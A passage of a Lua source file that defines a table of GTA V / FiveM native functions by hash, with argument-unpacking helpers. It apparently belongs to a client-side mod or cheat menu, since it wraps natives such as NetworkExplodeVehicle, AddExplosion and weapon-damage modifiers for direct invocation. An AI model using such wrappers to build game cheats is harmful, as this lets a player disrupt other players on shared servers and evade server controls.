                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
   
                end
   
            },
   
            ["RemoveBlip"] = {
   
                hash = 0x86A652570E5F25DD,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.Citizen.PointerValueIntInitialized(args[1])
   
                end
   
            },
   
            ["GetNuiCursorPosition"] = {
   
                hash = 0xbdba226f,
   
                unpack = function() return dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt() end
   
            },
   
            ["DoesEntityExist"] = {
   
                hash = 0x7239B21A38F536BA,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsEntityDead"] = {
   
                hash = 0x5F9532F3B5CC2551,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsPedDeadOrDying"] = {
   
                hash = 0x3317DEDB88C95038,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsPedShooting"] = {
   
                hash = 0x34616828CD07F1A1,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["PlaySoundFrontend"] = {
   
                hash = 0x67C540AA08E4A6F5,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], args[3], args[4]
   
                end
   
            },
   
            ["GetPedInVehicleSeat"] = {
   
                hash = 0xBB40DD2270B65366,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["HasAnimDictLoaded"] = {
   
                hash = 0xD031A9162D01088C,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["CreatePed"] = {
   
                hash = 0xD49F9B0955C367DE,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.type(args[2]) == "string" and AREF:GetFunction("GetHashKey")(args[2]) or args[2], args[3], args[4], args[5], args[6], args[7], args[8], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["CreatePedInsideVehicle"] = {
   
                hash = 0x7DD959874C1FD534,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.type(args[3]) == "string" and AREF:GetFunction("GetHashKey")(args[3]) or args[3], args[4], args[5], args[6], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["NetworkHasControlOfEntity"] = {
   
                hash = 0x01BF60A500E28887,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["SimulatePlayerInputGait"] = {
   
                hash = 0x477D5D63E63ECA5D
   
            },
   
            ["ResetPedRagdollTimer"] = {
   
                hash = 0x9FA4664CF62E47E8
   
            },
   
            ["IsVehicleDamaged"] = {
   
                hash = 0xBCDC5017D3CE1E9E,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["ToggleVehicleMod"] = {
   
                hash = 0x2A1F4F37F95BAD08
   
            },
   
            ["NetworkGetPlayerIndexFromPed"] = {
   
                hash = 0x6C0E2E0125610278,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["ResetPlayerStamina"] = {
   
                hash = 0xA6F312FCCE9C1DFE
   
            },
   
            ["GetEntityAlpha"] = {
   
                hash = 0x5A47B3B5E63E94C6,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["IsEntityVisible"] = {
   
                hash = 0x47D6F43D77935C75,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end,
   
                return_as = function(int) return int == 1 end
   
            },
   
            ["AreAnyVehicleSeatsFree"] = {
   
                hash = 0x2D34FC3BC4ADB780,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end,
   
                return_as = function(int) return int == 1 end
   
            },
   
            ["IsEntityVisibleToScript"] = {
   
                hash = 0xD796CB5BA8F20E32,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end,
   
                return_as = function(int) return int == 1 end
   
            },
   
            ["NetworkExplodeVehicle"] = {
   
                hash = 0x301A42153C9AD707
   
            },
   
            ["DisplayRadar"] = {
   
                hash = 0xA0EBB943C300E693
   
            },
   
            ["StopGameplayCamShaking"] = {
   
                hash = 0x0EF93E9F3D08C178
   
            },
   
            ["SetCamShakeAmplitude"] = {
   
                hash = 0xD93DB43B82BC0D00
   
            },
   
            ["SetCursorLocation"] = {
   
                hash = 0xFC695459D4D0E219
   
            },
   
            ["SetPlayerWeaponDamageModifier"] = {
   
                hash = 0xCE07B9F7817AADA3
   
            },
   
            ["SetPedArmour"] = {
   
                hash = 0xCEA04D83135264CC
   
            },
   
            ["SetEntityLocallyInvisible"] = {
   
                hash = 0xE135A9FF3F5D05D8
   
            },
   
            ["SetVehicleDoorsLockedForPlayer"] = {
   
                hash = 0x517AAF684BB50CD1
   
            },
   
            ["SetVehicleDoorsLockedForAllPlayers"] = {
   
                hash = 0xA2F80B8D040727CC
   
            },
   
            ["SetVehicleDoorsLocked"] = {
   
                hash = 0xB664292EAECF7FA6
   
            },
   
            ["SetVehicleTyresCanBurst"] = {
   
                hash = 0xEB9DC3C7D8596C46
   
            },
   
            ["SetVehicleMod"] = {
   
                hash = 0x6AF0636DDEDCB6DD
   
            },
   
            ["SetPedCoordsKeepVehicle"] = {
   
                hash = 0x9AFEFF481A85AB2E
   
            },
   
            ["SetVehicleEnginePowerMultiplier"] = {
   
                hash = 0x93A3996368C94158
   
            },
   
            ["GetFirstBlipInfoId"] = {
   
                hash = 0x1BEDE233E6CD2A1F,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetGroundZFor_3dCoord"] = {
   
                hash = 0xC906A7DAB05C8D2B,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], args[3], dict.Citizen.PointerValueFloat(), dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["GetBlipInfoIdCoord"] = {
   
                hash = 0xFA7C7F0AADF25D09,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
   
                end
   
            },
   
            ["GetNumVehicleMods"] = {
   
                hash = 0xE38E9162A2500646,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["SetVehicleModKit"] = {
   
                hash = 0x1F2AA07F00B3217A
   
            },
   
            ["SetPedToRagdoll"] = {
   
                hash = 0xAE99FB955581844A
   
            },
   
            ["SetVehicleFixed"] = {
   
                hash = 0x115722B1B9C14C1C
   
            },
   
            ["SetPedKeepTask"] = {
   
                hash = 0x971D38760FBC02EF
   
            },
   
            ["NetworkGetNetworkIdFromEntity"] = {
   
                hash = 0xA11700682F3AD45C,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["RemoveWeaponFromPed"] = {
   
                hash = 0x4899CB088EDF59B8
   
            },
   
            ["SetNetworkIdSyncToPlayer"] = {
   
                hash = 0xA8A024587329F36A
   
            },
   
            ["SetNetworkIdCanMigrate"] = {
   
                hash = 0x299EEB23175895FC
   
            },
   
            ["DoesCamExist"] = {
   
                hash = 0xA7A932170592B50E
   
            },
   
            ["CreateCam"] = {
   
                hash = 0xC3981DCE61D9E13F
   
            },
   
            ["GetGameplayCamRot"] = {
   
                hash = 0x837765A25378F0BB,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
   
                end
   
            },
   
            ["GetCamRot"] = {
   
                hash = 0x7D304C1C955E3E12,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
   
                end
   
            },
   
            ["StartVehicleAlarm"] = {
   
                hash = 0xB8FF7AB45305C345
   
            },
   
            ["DetachVehicleWindscreen"] = {
   
                hash = 0x6D645D59FB5F5AD3
   
            },
   
            ["StartShapeTestRay"] = {
   
                hash = 0x377906D8A31E5586,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], args[9], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetShapeTestResult"] = {
   
                hash = 0x3D87450E15D98694,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueInt(), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end,
   
                return_as = function(...)
   
                    local ret = {...}
   
    
   
                    return ret[1], ret[2] == 1, ret[3], ret[4], ret[5]
   
                end
   
            },
   
            ["AddExplosion"] = {
   
                hash = 0xE3AD2BDBAEE269AC
   
            },
   
            ["CreateVehicle"] = {
   
                hash = 0xAF35D0D2583051B0,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.type(args[1]) == "string" and AREF:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], args[4], args[5], args[6], args[7], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["SetPedIntoVehicle"] = {
   
                hash = 0xF75B0D629E1C063D
   
            },
   
            ["SetPedAlertness"] = {
   
                hash = 0xDBA71115ED9941A6
   
            },
   
            ["TaskVehicleDriveToCoordLongrange"] = {
   
                hash = 0x158BB33F920D360C
   
            },
   
            ["TaskGoToCoordAnyMeans"] = {
   
                hash = 0x5BC448CB78FA3E88
   
            },
   
            ["TaskVehicleDriveWander"] = {
   
                hash = 0x480142959D337D00
   
            },
   
            ["CreateObject"] = {
   
                hash = 0x509D5878EB39E842,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.type(args[1]) == "string" and AREF:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], args[4], args[5], args[6], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["DeletePed"] = {
   
                hash = 0x9614299DCB53E54B,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.Citizen.PointerValueIntInitialized(args[1])
   
                end
   
            },
   
            ["DeleteEntity"] = {
   
                hash = 0xAE3CBE5BF394C9C9,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.Citizen.PointerValueIntInitialized(args[1])
   
                end
   
            },
   
            ["DeleteObject"] = {
   
                hash = 0x539E0AE3E6634B9F,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.Citizen.PointerValueIntInitialized(args[1])
   
                end
   
            },
   
            ["DeleteVehicle"] = {
   
                hash = 0xEA386986E786A54F,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.Citizen.PointerValueIntInitialized(args[1])
   
                end
   
            },
   
            ["NetworkRequestControlOfEntity"] = {
   
                hash = 0xB69317BF5E782347,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["GetModelDimensions"] = {
   
                hash = 0x03E8D3D5F549087A,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.type(args[1]) == "string" and AREF:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector()
   
                end
   
            },
   
            ["GetEntityModel"] = {
   
                hash = 0x9F47B058362C84B5,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["SetEntityAsMissionEntity"] = {
   
                hash = 0xAD738C3085FE7E11
   
            },
   
            ["SetEntityVelocity"] = {
   
                hash = 0x1C99BB7B6E96D16F
   
            },
   
            ["SetEntityRotation"] = {
   
                hash = 0x8524A8B0171D5E07
   
            },
   
            ["SetEntityLocallyVisible"] = {
   
                hash = 0x241E289B5C059EDC
   
            },
   
            ["SetEntityAlpha"] = {
   
                hash = 0x44A0870B7E92D7C0
   
            },
   
            ["SetEntityCollision"] = {
   
                hash = 0x1A9205C1B9EE827F
   
            },
   
            ["SetEntityCoords"] = {
   
                hash = 0x06843DA7060A026B
   
            },
   
            ["GivePlayerRagdollControl"] = {
   
                hash = 0x3C49C870E66F0A28
   
            },
   
            ["GetHashKey"] = {
   
                hash = 0xD24D37CC275948CC,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.tostring(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetVehiclePedIsIn"] = {
   
                hash = 0x9A9112A0FE9A4713
   
            },
   
            ["PlayerPedId"] = {
   
                hash = 0xD80958FC74E988A6,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
   
            },
   
            ["GetPlayerPed"] = {
   
                hash = 0x43A66C31C68491C0
   
            },
   
            ["HasModelLoaded"] = {
   
                hash = 0x98A4EB5D89A0C952,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.type(args[1]) == "string" and AREF:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["SetPedCanRagdoll"] = {
   
                hash = 0xB128377056A54E2A
   
            },
   
            ["RequestModel"] = {
   
                hash = 0x963D27A58DF860AC,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.type(args[1]) == "string" and AREF:GetFunction("GetHashKey")(args[1]) or args[1]
   
                end
   
            },
   
            ["SetTextFont"] = {
   
                hash = 0x66E0276CC5F6B9DA
   
            },
   
            ["SetTextProportional"] = {
   
                hash = 0x038C1F517D7FDCF8
   
            },
   
            ["HasStreamedTextureDictLoaded"] = {
   
                hash = 0x0145F696AAAAD2E4
   
            },
   
            ["RequestStreamedTextureDict"] = {
   
                hash = 0xDFA2EF8E04127DD5
   
            },
   
            ["GetActiveScreenResolution"] = {
   
                hash = 0x873C9F3104101DD3,
   
                unpack = function() return dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt() end
   
            },
   
            ["IsDisabledControlJustPressed"] = {
   
                hash = 0x91AEF906BCA88877,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsDisabledControlJustReleased"] = {
   
                hash = 0x305C8DCD79DA8B0F,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsDisabledControlPressed"] = {
   
                hash = 0xE2587F8CBBD87B1D,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsDisabledControlReleased"] = {
   
                hash = 0xFB6C4072E9A32E92,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsControlJustPressed"] = {
   
                hash = 0x580417101DDB492F,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsControlJustReleased"] = {
   
                hash = 0x50F940259D3841E6,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsControlPressed"] = {
   
                hash = 0xF3A21BCD95725A4A,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsControlReleased"] = {
   
                hash = 0x648EE3E7F38877DD,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["ClearPedTasks"] = {
   
                hash = 0xE1EF3C1216AFF2CD
   
            },
   
            ["ClearPedTasksImmediately"] = {
   
                hash = 0xAAA34F8A7CB32098
   
            },
   
            ["ClearPedSecondaryTask"] = {
   
                hash = 0x176CECF6F920D707
   
            },
   
            ["SetEntityProofs"] = {
   
                hash = 0xFAEE099C6F890BB8
   
            },
   
            ["SetCamActive"] = {
   
                hash = 0x026FB97D0A425F84
   
            },
   
            ["SetCamAffectsAiming"] = {
   
                hash = 0x8C1DC7770C51DC8D
   
            },
   
            ["RenderScriptCams"] = {
   
                hash = 0x07E5B515DB0636FC,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], args[3], args[4], args[5]
   
                end
   
            },
   
            ["GetEntityForwardVector"] = {
   
                hash = 0x0A794A5A57F8DF91,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
   
                end
   
            },
   
            ["RequestAnimDict"] = {
   
                hash = 0xD3BD40951412FEF6
   
            },
   
            ["SetTextScale"] = {
   
                hash = 0x07C837F9A01C34C9
   
            },
   
            ["SetTextColour"] = {
   
                hash = 0xBE6B23FFA53FB442
   
            },
   
            ["SetTextDropShadow"] = {
   
                hash = 0x465C84BC39F1C351
   
            },
   
            ["SetTextEdge"] = {
   
                hash = 0x441603240D202FA6
   
            },
   
            ["SetTextOutline"] = {
   
                hash = 0x2513DFB0FB8400FE
   
            },
   
            ["ClearPedBloodDamage"] = {
   
                hash = 0x8FE22675A5A45817
   
            },
   
            ["SetEntityHealth"] = {
   
                hash = 0x6B76DC1F3AE6E6A3
   
            },
   
            ["NetworkResurrectLocalPlayer"] = {
   
                hash = 0xEA23C49EAA83ACFB
   
            },
   
            ["SetTextCentre"] = {
   
                hash = 0xC02F4DBFB51D988B
   
            },
   
            ["BeginTextCommandDisplayText"] = {
   
                hash = 0x25FBB336DF1804CB
   
            },
   
            ["BeginTextCommandWidth"] = {
   
                hash = 0x54CE8AC98E120CAB
   
            },
   
            ["EndTextCommandGetWidth"] = {
   
                hash = 0x85F061DA64ED2F67,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ResultAsFloat()
   
                end
   
            },
   
            ["GetTextScaleHeight"] = {
   
                hash = 0xDB88A37483346780,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ResultAsFloat()
   
                end
   
            },
   
            ["DrawSprite"] = {
   
                hash = 0xE7FFAE5EBF23D890
   
            },
   
            ["FreezeEntityPosition"] = {
   
                hash = 0x428CA6DBD1094446
   
            },
   
            ["GetPedBoneIndex"] = {
   
                hash = 0x3F428D08BE5AAE31,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetWorldPositionOfEntityBone"] = {
   
                hash = 0x44A8FCB8ED227738,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
   
                end
   
            },
   
            ["GetPedBoneCoords"] = {
   
                hash = 0x17C07FC640E86B4E,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], args[3], args[4], args[5], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
   
                end
   
            },
   
            ["SetPedShootsAtCoord"] = {
   
                hash = 0x96A05E4FB321B1BA
   
            },
   
            ["GetEntityBoneIndexByName"] = {
   
                hash = 0xFB71170B7E76ACBA,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.tostring(args[2]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetOffsetFromEntityInWorldCoords"] = {
   
                hash = 0x1899F328B0E12848,
   
                unpack = function(...)
   
                    local args = (...)
   
                    local x, y, z
   
    
   
                    if dict.type(args[2]) == "table" or dict.type(args[2]) == "vector" then
   
                        x = args[2].x
   
                        y = args[2].y
   
                        z = args[2].z
   
                    else
   
                        x = args[2]
   
                        y = args[3]
   
                        z = args[4]
   
                    end
   
    
   
                    return args[1], x, y, z, dict.Citizen.ResultAsVector()
   
                end
   
            },
   
            ["AddTextEntry"] = {
   
                hash = 0x32CA01C3,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.tostring(args[1]), dict.tostring(args[2])
   
                end
   
            },
   
            ["AddTextComponentSubstringPlayerName"] = {
   
                hash = 0x6C188BE134E074AA
   
            },
   
            ["EndTextCommandDisplayText"] = {
   
                hash = 0xCD015E5BB0D96A57
   
            },
   
            ["IsPedInAnyVehicle"] = {
   
                hash = 0x997ABD671D25CA0B
   
            },
   
            ["GetEntityHeading"] = {
   
                hash = 0xE83D4F9BA2A38914,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
   
                end
   
            },
   
            ["AddBlipForCoord"] = {
   
                hash = 0x5A039BB0BCA604B6
   
            },
   
            ["SetBlipSprite"] = {
   
                hash = 0xDF735600A4696DAF
   
            },
   
            ["SetBlipColour"] = {
   
                hash = 0x03D7FB09E75D6B7E
   
            },
   
            ["SetBlipScale"] = {
   
                hash = 0xD38744167B2FA257
   
            },
   
            ["SetBlipCoords"] = {
   
                hash = 0xAE2AF67E9D9AF65D
   
            },
   
            ["SetBlipRotation"] = {
   
                hash = 0xF87683CDF73C3F6E
   
            },
   
            ["ShowHeadingIndicatorOnBlip"] = {
   
                hash = 0x5FBCA48327B914DF
   
            },
   
            ["SetBlipCategory"] = {
   
                hash = 0x234CDD44D996FD9A
   
            },
   
            ["BeginTextCommandSetBlipName"] = {
   
                hash = 0xF9113A30DE5C6670
   
            },
   
            ["GetPlayerName"] = {
   
                hash = 0x6D0DE6A7B5DA71F8,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ResultAsString()
   
                end
   
            },
   
            ["EndTextCommandSetBlipName"] = {
   
                hash = 0xBC38B49BCB83BC9B
   
            },
   
            ["DrawRect"] = {
   
                hash = 0x3A618A217E5154F0
   
            },
   
            ["IsEntityInAir"] = {
   
                hash = 0x886E37EC497200B6
   
            },
   
            ["EnableAllControlActions"] = {
   
                hash = 0xA5FFE9B05F199DE7
   
            },
   
            ["EnableControlAction"] = {
   
                hash = 0x351220255D64C155
   
            },
   
            ["DisableAllControlActions"] = {
   
                hash = 0x5F4B6931816E599B
   
            },
   
            ["TaskWanderStandard"] = {
   
                hash = 0xBB9CE077274F6A1B
   
            },
   
            ["TaskWarpPedIntoVehicle"] = {
   
                hash = 0x9A7D091411C5F684
   
            },
   
            ["SetMouseCursorActiveThisFrame"] = {
   
                hash = 0xAAE7CE1D63167423
   
            },
   
            ["SetMouseCursorSprite"] = {
   
                hash = 0x8DB8CFFD58B62552
   
            },
   
            ["GiveDelayedWeaponToPed"] = {
   
                hash = 0xB282DC6EBD803C75
   
            },
   
            ["ApplyForceToEntity"] = {
   
                hash = 0xC5F68BE9613E2D18
   
            },
   
            ["GetScreenCoordFromWorldCoord"] = {
   
                hash = 0x34E82F05DF2974F5,
   
                unpack = function(...)
   
                    local args = (...)
   
                    local x, y, z
   
    
   
                    if dict.type(args[1]) == "table" or dict.type(args[1]) == "vector" then
   
                        x = args[1].x
   
                        y = args[1].y
   
                        z = args[1].z
   
                    else
   
                        x = args[1]
   
                        y = args[2]
   
                        z = args[3]
   
                    end
   
    
   
                    return x, y, z, dict.Citizen.PointerValueFloat(), dict.Citizen.PointerValueFloat(), dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["NetworkIsPlayerTalking"] = {
   
                hash = 0x031E11F3D447647E,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["SetDrawOrigin"] = {
   
                hash = 0xAA0008F3BBB8F416
   
            },
   
            ["ClearDrawOrigin"] = {
   
                hash = 0xFF0B610F6BE0D7AF
   
            },
   
            ["GetRenderingCam"] = {
   
                hash = 0x5234F9F10919EABA,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
   
            },
   
            ["GetGameplayCamCoord"] = {
   
                hash = 0x14D6F5678D8F1B37,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector() end
   
            },
   
            ["GetFinalRenderedCamCoord"] = {
   
                hash = 0xA200EB1EE790F448,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector() end
   
            },
   
            ["GetGameplayCamFov"] = {
   
                hash = 0x65019750A0324133,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat() end
   
            },
   
            ["ObjToNet"] = {
   
                hash = 0x99BFDC94A603E541,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["StatSetInt"] = {
   
                hash = 0xB3271D7AB655B441,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.type(args[1]) == "string" and AREF:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["NetworkSetNetworkIdDynamic"] = {
   
                hash = 0x2B1813ABA29016C5
   
            },
   
            ["SetNetworkIdExistsOnAllMachines"] = {
   
                hash = 0xE05E81A888FA63C8
   
            },
   
            ["GetDistanceBetweenCoords"] = {
   
                hash = 0xF1B760881820C952,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], args[3], args[4], args[5], args[6], args[7], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
   
                end
   
            },
   
            ["SetEntityHeading"] = {
   
                hash = 0x8E2530AA8ADA980E
   
            },
   
            ["HasScaleformMovieLoaded"] = {
   
                hash = 0x85F01B8D5B90570E,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["RequestScaleformMovie"] = {
   
                hash = 0x11FE353CF9733E6F,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.tostring(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["BeginScaleformMovieMethod"] = {
   
                hash = 0xF6E48914C7A8694E
   
            },
   
            ["EndScaleformMovieMethodReturnValue"] = {
   
                hash = 0xC50AA39A577AF886,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
   
            },
   
            ["ScaleformMovieMethodAddParamInt"] = {
   
                hash = 0xC3D0841A0CC546A6
   
            },
   
            ["ScaleformMovieMethodAddParamTextureNameString"] = {
   
                hash = 0xBA7148484BD90365
   
            },
   
            ["DisableControlAction"] = {
   
                hash = 0xFE99B66D079CF6BC
   
            },
   
            ["PlayerId"] = {
   
                hash = 0x4F8644AF03D0E0D6,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
   
            },
   
            ["ShootSingleBulletBetweenCoords"] = {
   
                hash = 0x867654CBC7606F2C,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], dict.type(args[9]) == "string" and AREF:GetFunction("GetHashKey")(args[9]) or args[9], args[10], args[11], args[12], args[13]
   
                end
   
            },
   
            ["ClearAreaOfProjectiles"] = {
   
                hash = 0x0A1CB9094635D1A6
   
            },
   
            ["GetPedLastWeaponImpactCoord"] = {
   
                hash = 0x6C4D0409BA1A2BC2,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.PointerValueVector(), dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["SetExplosiveMeleeThisFrame"] = {
   
                hash = 0xFF1BED81BFDC0FE0
   
            },
   
            ["GetCurrentPedWeaponEntityIndex"] = {
   
                hash = 0x3B390A939AF0B5FC,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
